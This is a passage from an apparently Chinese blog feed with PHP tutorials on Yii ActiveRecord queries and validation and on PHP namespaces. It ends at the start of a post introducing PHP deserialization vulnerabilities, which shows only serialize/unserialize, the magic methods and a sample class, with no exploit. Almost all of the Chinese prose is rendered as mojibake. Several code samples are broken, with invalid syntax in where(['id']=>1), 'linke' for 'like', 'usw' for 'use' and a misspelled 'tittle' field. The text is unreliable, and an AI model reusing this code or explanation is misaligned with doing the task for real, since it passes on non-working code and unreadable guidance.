<span class="comment">// $results = Test::findBySql($sql,array(':id'=&gt;1))-&gt;all();    // åˆ©ç”¨å ä½ç¬¦ å¯ä»¥é˜²æ­¢sqlæ³¨å…¥ æ— è®ºæ‹¼æ¥çš„æ˜¯ä»€ä¹ˆ éƒ½ä¼šå½“æˆä¸€ä¸ªå­—ç¬¦</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $results = Test::find()-&gt;where([<span class="string">'id'</span>]=&gt;<span class="number">1</span>)-&gt;all();</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ˜¾å¾—ç®€æ´å¤šäº†<br>å¦‚æœè¦æŸ¥è¯¢id&gt;0 çš„è¯å°±è¦ç”¨ç¬¬ä¸‰ä¸ªå‚æ•°</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'&gt;'</span>,<span class="string">'id'</span>,<span class="string">'0'</span>])</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢id&gt;=1  id&lt;=2</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'between'</span>,<span class="string">'id'</span>,<span class="number">1</span>,<span class="number">2</span>])</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure><p>like æ“ä½œ  </p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'linke'</span>,<span class="string">'title'</span>,<span class="string">'title'</span>])</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure><p>ç”¨asArray å¯ä»¥é™ä½å†œæ‘ä½¿ç”¨é‡å’Œä½¿ä»£ç ï¼Œæ•°æ®æ¸…æ™°</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'linke'</span>,<span class="string">'title'</span>,<span class="string">'title'</span>])</span>-&gt;</span>asArray<span class="function"><span class="params">()</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure><p>æ‰¹é‡æŸ¥è¯¢<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach<span class="function"><span class="params">(Test::find()-&gt;batch(<span class="number">1</span>) as $tests)</span>&#123;</span></span><br><span class="line"><span class="function">      <span class="title">printf</span><span class="params">(count($tests))</span>   // æ¯æ¬¡æ“ä½œä¸€æ¡æ•°æ® å°†ç»“æœæ”¾åœ¨<span class="title">$tests</span></span></span><br><span class="line"><span class="function">    &#125;</span></span><br></pre></td></tr></table></figure></p><p>è¿›è¡Œåˆ é™¤æ“ä½œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find()-&gt;where([<span class="string">'id'</span>]=&gt;<span class="number">1</span>)-&gt;all();</span><br><span class="line">    $results[<span class="number">0</span>]-&gt;delete();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç¬¬äºŒä¸­æ–¹æ³•,åŠåˆ©ç”¨å ä½ç¬¦</span></span><br><span class="line">    Test::deleteAll(<span class="string">'id&gt;:id'</span>,<span class="keyword">array</span>(<span class="string">':id'</span>=&gt;<span class="number">0</span>)); <span class="comment">//</span></span><br></pre></td></tr></table></figure></p><p>è¿›è¡Œå¢åŠ æ•°æ®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php">usw app\models\Test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloControllers</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $test = <span class="keyword">new</span> Test;</span></span><br><span class="line"><span class="php">    $test-&gt;id = <span class="number">3</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;title  = <span class="string">'title3'</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;save();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨rules è¿›è¡ŒéªŒè¯<br>modelæ–‡ä»¶å¤¹ä¸‹çš„Test.phpå†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">models</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">ActiveRecord</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">ActiveRecord</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> [</span></span><br><span class="line"><span class="php">    [<span class="string">'id'</span>,<span class="string">'integer'</span>],</span></span><br><span class="line"><span class="php">    [<span class="string">'tittle'</span>,<span class="string">'string'</span>,<span class="string">'length'</span>=&gt;[<span class="number">0</span>,<span class="number">5</span>]]</span></span><br><span class="line"><span class="php">    ];</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>æ§åˆ¶å™¨HelloController.phpä»£ç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">models</span>\<span class="title">Test</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $test = <span class="keyword">new</span> Test;</span></span><br><span class="line"><span class="php">    $test-&gt;id = <span class="string">'zxc'</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;tittle  = <span class="string">'title3'</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;validate();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($test-&gt;hasErrors())&#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"data is error"</span>;</span></span><br><span class="line"><span class="php">      <span class="keyword">die</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $test-&gt;save();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>å½“id ä¸ºå­—ç¬¦æ—¶  ä¸æ»¡è¶³éªŒè¯å™¨0-5 çš„è®¿é—®  è¿”å›data  error</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0n6zz19mjj30jb06qmxa.jpg" alt=""></p><p>æ¥ä¸‹æ¥è¿›è¡Œä¿®æ”¹æ“ä½œ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">models</span>\<span class="title">Test</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $test = Test::find()-&gt;where([<span class="string">'id'</span>=&gt;<span class="number">1</span>])-&gt;one();  <span class="comment">//å–å‡ºä¸€è§’æ•°æ®æ”¾åœ¨noe è€Œä¸æ˜¯all()</span></span></span><br><span class="line"><span class="php">    $test-&gt;tittle = <span class="string">'title4'</span>;  <span class="comment">// è¿›è¡Œä¿®æ”¹</span></span></span><br><span class="line"><span class="php">    $test-&gt;save();  <span class="comment">// ç„¶åè¿›è¡Œä¿å­˜</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>å¯ä»¥åŠ ä¸ªåˆ¤æ–­<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0n7inujhij30x90fhwg0.jpg" alt=""><br>æ¥ä¸‹æ¥è¿›è¡Œ <strong>å…³è”æŸ¥è¯¢</strong><br>æ‰€è°“å…³è”æŸ¥è¯¢ å°±æ˜¯ æ¯”å¦‚æœ‰ä¸¤å¼ è¡¨ 1é¡¾å®¢è¡¨ 2è®¢å•è¡¨ å¤šä¸ªè®¢å•å¯¹åº”ä¸€ä¸ªé¡¾å®¢  å½¢æˆä¸€å¯¹å¤šçš„å…³ç³» ä¸€ä¸ªè®¢å•å¯¹åº” ä¸€ä¸ªé¡¾å®¢ å½¢æˆä¸€å¯¹ä¸€çš„å…³ç³»</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ncblgpkvj30re0e5jtk.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0nccfw7spj30wk0ewmzh.jpg" alt=""><br>æ¥ä¸‹æ¥ç¼–å†™ order.php  customer.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0nc9oikinj311b0gz40d.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ncap4qgxj30zw0at3z1.jpg" alt=""></p><p>æˆåŠŸå¾—åˆ°æ•°æ®</p><p>ä½†æ˜¯åœ¨æ§åˆ¶å™¨è¿›è¡Œæ•°æ®åº“çš„æ“ä½œä¸æ»¡è¶³mvc åœ¨modelç±» è¿›è¡Œå°è£…ä¸€ä¸ª æ“ä½œæ•°æ®åº“çš„ç±»<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ncmus1rgj31160jbjtm.jpg" alt=""></p><p>  åœ¨è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ ä¼šæŠŠæŸ¥è¯¢å†…å®¹æ”¾åˆ°select è¯­å¥ä¸­,å½“è¿™ä¸ªæ•°æ®æ›´æ–°æ—¶ä¸ä¼šå†è¿›è¡Œselect è€Œæ˜¯æ‹¿ä¸Šæ¬¡slect çš„ç»“æœ æ‰€ä»¥å¦‚æœè¦å†è¿›è¡Œselect æ—¶  éœ€è¦ç”¨unset()é‡Šæ”¾é‚£ä¸ªç»“æœ</p>]]></content>
      
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>namespaceå‘½åç©ºé—´</title>
      <link href="/2019/02/26/namespace%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"/>
      <url>/2019/02/26/namespace%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="namespaceè§£å†³å‘½åå†²çªé—®é¢˜"><a href="#namespaceè§£å†³å‘½åå†²çªé—®é¢˜" class="headerlink" title="namespaceè§£å†³å‘½åå†²çªé—®é¢˜"></a>namespaceè§£å†³å‘½åå†²çªé—®é¢˜</h2><p>a.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// namespace a\b\c;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">get_info</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'this is A'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>b.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// namespace a\b\d;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">get_info</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'this is B'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span>(<span class="symbol">'a</span>.php');</span><br><span class="line"><span class="keyword">include</span>(<span class="symbol">'b</span>.php');</span><br></pre></td></tr></table></figure><p>è®¿é—®index.phpæ—¶ä¼šæŠ¥é”™<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4cyogo9j30ui023q2w.jpg" alt=""><br>å½“åŠ ä¸Šnamepaseæ—¶, å°±ä¸ä¼šæŠ¥é”™</p><p>å½“å®ä¾‹åŒ–å¯¹è±¡æ—¶ ä¹Ÿè¦åŠ ä¸Šå‘½åç©ºé—´</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$a</span> = new a\b\c\Apple();</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$a</span>-&gt;get_info();</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4jt2b20j30fd043q2q.jpg" alt=""><br>å¯ä»¥åŠ ä¸Šuse a\b\c\Apple<br>ä»¥åå®ä¾‹åŒ–å°±ä¸ç”¨åŠ ä¸Šå‰é¢çš„é‡å¤ä»£ç äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">c</span>\<span class="title">Apple</span>;</span><br><span class="line">$a = <span class="keyword">new</span> Apple();</span><br><span class="line">$a2 = <span class="keyword">new</span> Apple();</span><br><span class="line">$a3 = <span class="keyword">new</span> Apple();</span><br><span class="line"></span><br><span class="line">$a-&gt;get_info();</span><br><span class="line">$a2-&gt;get_info();</span><br><span class="line">$a3-&gt;get_info();</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4nnecr0j309l01n0si.jpg" alt=""><br>å¦‚æœæˆ‘ä»¬æƒ³å®ä¾‹åŒ–B.phpé‡Œé¢çš„Appleæ—¶</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$b</span> = new a\b\d\Apple();</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">$b</span>-&gt;get_info();</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4sqmw2ej307202fgld.jpg" alt=""><br>ä½†æ˜¯å¦‚æœæˆ‘ä»¬å¤šæ¬¡ä½¿ç”¨æ—¶ä¹Ÿä¼šé€ æˆ é‡å¤å¤šä½™<br>å¦‚æœåŠ ä¸Šuse a\b\d\Apple;<br>ä¼šä¸use a\b\c\Apple  äº§ç”Ÿå†²çª ,äºæ˜¯åˆ©ç”¨å–åˆ«å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">c</span>\<span class="title">Apple</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">d</span>\<span class="title">Apple</span> <span class="title">as</span> <span class="title">BApple</span>;</span><br><span class="line"><span class="comment">// $a = new Apple();</span></span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> BApple();</span><br><span class="line"></span><br><span class="line">$b-&gt;get_info();</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4wu4ur7j305301u3y9.jpg" alt=""></p><p>å½“æœ‰ä¸ªc.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">get_info</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'this is C'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>å½“åœ¨index.phpè°ƒç”¨c.phpä¸­çš„Apple<br>æ­¤ä¸ºå…¨å±€é¡¶å±‚ç±»,è¦æƒ³å¯¹å…¨å±€é¡¶å±‚ç±»è¿›è¡Œå®ä¾‹åŒ– éœ€è¦åœ¨å®ä¾‹åŒ–åŠ ä¸Šåæ–œæ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'a.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'b.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'c.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">c</span>\<span class="title">Apple</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">d</span>\<span class="title">Apple</span> <span class="title">as</span> <span class="title">BApple</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$b = <span class="keyword">new</span> BApple();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$c = <span class="keyword">new</span> \Apple();</span></span><br><span class="line"><span class="php">$c-&gt;get_info();</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k54g6i57j309n02ejr5.jpg" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>phpååºåˆ—åŒ–æ¼æ´å…¥é—¨åˆ°æ”¾å¼ƒ</title>
      <link href="/2019/01/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/"/>
      <url>/2019/01/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>åºåˆ—åŒ–å°±æ˜¯:<br>å°†phpå˜é‡æ¯”å¦‚phpæ•°ç»„æˆ–è€…å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµ,å­—èŠ‚æµå¯ä»¥å‚¨å­˜åœ¨æ•°æ®åº“é‡Œé¢</p><p>ç›¸å…³å‡½æ•°:</p><pre><code>serialize()              //å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²unserialize()           // å°†å­—ç¬¦ä¸²è¿˜åŸä¸ºä¸€ä¸ªå¯¹è±¡addslashes()                // å¯¹å†™å…¥æ•°æ®åº“çš„æ•°æ®è¿›è¡Œå¤„ç†,stripslashes()                //å¯¹æ•°æ®è¿›è¡Œå¤„ç†</code></pre><p>   ç›¸å…³æ–¹æ³•:</p><pre><code>__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘,è°ƒç”¨ä¸åˆ°æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</code></pre><h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p><strong>ä¾‹å­</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $flag = <span class="string">"123"</span>;   <span class="comment">//åºåˆ—åŒ–åä¸º &lt;0x00&gt;test&lt;0x00&gt;flag</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $flag1 = <span class="string">"123"</span>;   <span class="comment">//åºåˆ—åŒ–åä¸ºflag</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $a =<span class="string">"aaa"</span>;        <span class="comment">// åºåˆ—åŒ–åä¸ºa</span></span></span><br><span class="line"><span class="php">    <span class="keyword">static</span> $b =<span class="string">"bbb"</span>;        <span class="comment">// åºåˆ—åŒ–åä¸å­˜åœ¨ä¸åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å†…   </span></span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $c= <span class="string">"ccc"</span>;     <span class="comment">//åºåˆ—åŒ–å  &lt;0x00&gt;*&lt;0x00&gt;c</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$test1  = <span class="keyword">new</span> test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$data = serialize($test1); <span class="comment">//å°†å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $data.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> 